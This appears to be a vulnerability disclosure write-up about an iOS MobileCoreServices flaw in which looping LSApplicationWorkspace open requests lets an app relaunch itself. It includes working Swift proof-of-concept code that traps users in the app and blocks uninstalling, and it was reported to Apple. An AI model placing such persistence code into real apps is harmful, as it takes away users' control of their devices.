## Caller validation vulnerability in MobileCoreServices leading to a persistence exploit

Reported to apple, No CVE assigned yet!

### How I found it?

I was researching `MobileCoreServices`, specifically `LSApplicationWorkspace` and found it very interesting that you can use a couple of its methods without any entitlements. I stumbled over this because of my Nyxian project which is basically Xcode for iOS with app distribution functionalities and even auto launch after install. I was looking for a method to automatically open the apps. I've found what I was looking for...

```objc
- (BOOL)openApplicationWithBundleID:(id)arg1;
```

... tho this wasnt yet the moment I realised this potential vulnerability exists. First when I researched `LSApplicationWorkspace` more. I wanted to find a method that helps me determine if a app has been sucessfully installed on the device after sending the app using OTA methods to the device it self and insanely enough I found it...

```objc
- (id)installProgressForBundleID:(id)arg1 makeSynchronous:(unsigned char)arg2;
```

... this method allowed me to get a `NSProgress` object, when I then tried to apply a handler to it I got a error, it said that I cannot apply a handler to it because it belongs to a other process and additionally the app crashed. This made me think "If this is handled by a other process, then opening must be too"...

### Vulnerability

First I assumed that apple already accounted for this possibility given the time `MobileCoreServices` and `LSApplicationWorkspace` already exist, but to my suprise they didnt account for it. First I tried to loop call the function on my own BundleID. I expected the process handling the openage to already account for the callers presence and abort if the caller is not present anymore.

```swift
import SwiftUI
import Foundation

func pthread_dispatch(_ code: @escaping () -> Void) {
    var thread: pthread_t?
    let blockPointer = UnsafeMutableRawPointer(Unmanaged.passRetained(code as AnyObject).toOpaque())
    
    pthread_create(&thread, nil, { ptr in
        let unmanaged = Unmanaged<AnyObject>.fromOpaque(ptr)
        let block = unmanaged.takeRetainedValue() as! () -> Void
        block()
        return nil
    }, blockPointer)
}

struct ContentView: View {
  var body: some View {
    Text("You now have to force reboot now")
    .onAppear {
      // Get the workspace
      guard let workspace = LSApplicationWorkspace.default() else { return }
      
      // Make a background thread
      pthread_dispatch {
        // Make a loop
        while true {
          // This will request to open the app constantly
          workspace.openApplication(withBundleID: Bundle.main.bundleIdentifier)
        }
      }
    }
  }
}
```

After I ran the code I've discovered a few things..

- The user cannot close the app without the app being relaunched again
- The user cannot interact with their device properly(eg. If they return to home they get thrown back into the app exploiting the vulnerability)
- The user cannot uninstall the app because of the small time frame they can dismiss the app.

The most insane about this is obviously "The user cannot close the app without the app being relaunched again", why? because it violates iOS core assumptions such as if a user closes a app it stays closed, but this basically proves that we can exploit this vulnerability in a reliable way to reincarnate the app after the user closed it.

###### Restart a iOS app programatically

I thought a bit further and thought about another topic, well iOS doesnt allow you for example to programatically restart your app. I thought about why this even works. And I just tried something out and it didnt worked yet, but read further.

```swift
import SwiftUI
import Foundation

struct ContentView: View {
  var body: some View {
    Button("Restart App") {
      // Get the workspace
      guard let workspace = LSApplicationWorkspace.default() else { return }
      
      // Start a background thread that attempts to reopen the currently opened app constantly
      pthread_dispatch {
        while true {
          workspace.openApplication(withBundleID: Bundle.main.bundleIdentifier)
        }
      }
      
      // Now attempt to exit
      exit(0)
    }
    Text("Process ID: \(getpid())")
  }
}
```

Expectedly this did not worked or the sucess rate was pretty bad, but then I attempted something differently and I was stunned by this dicovery. It turns out the sucess rate of restarting your own app using this vulnerability increases the longer the loop occurs. So i changed...

```swift
exit(0)
```

To this...

```swift
pthread_dispatch {
  // wait 0.2 seconds
  Thread.sleep(forTimeInterval: 0.2)
  // now exit the app
  exit(0)
}
```

Using this I made the implementation for restarting the iOS app it self reliable.

### How does it work?

It works because of improper checks of the `lsd` (Launch Services Daemon) which is responsible for managing requests of opening applications via the `MobileCoreServices` framework, specifically when invoking `- (BOOL)openApplicationWithBundleID:(id)arg1;` your app is giving the request to `lsd` which then manages to open the app, so where is the problem... when ur doing it in a while loop and in a background thread you dont wait on the return of this method and can simply continue code execution without waiting on its return which apple didnt accounted for, although this is a common security concern. What then happens is that if we call `exit(0)` the `lsd` process is still processing the request. When your app then gets terminated by your own `exit(0)` call `lsd` fails to address that and continues with opening your own app although terminated which results in the app self relaunching.

### Why is this dangerous?

A attacker could use this vulnerability maliciously to bypass the user interaction of killing the attackers app using the app switcher and bypassing the users attempt to uninstall the app(which is a side-effect cause of the self-open which dismisses the uninstallation menu) and additionally stay opened for ever, no matter what the user does, which leads to a malicious **persistence exploit**. Additionally as the opening of the app is a side-effect it's super annoying. It's also a privacy concern as data can be exfiltrated without the users consent. And the vulnerability could be used in a chain to ensure the user cannot escape a certain hacking attempt of their phone.



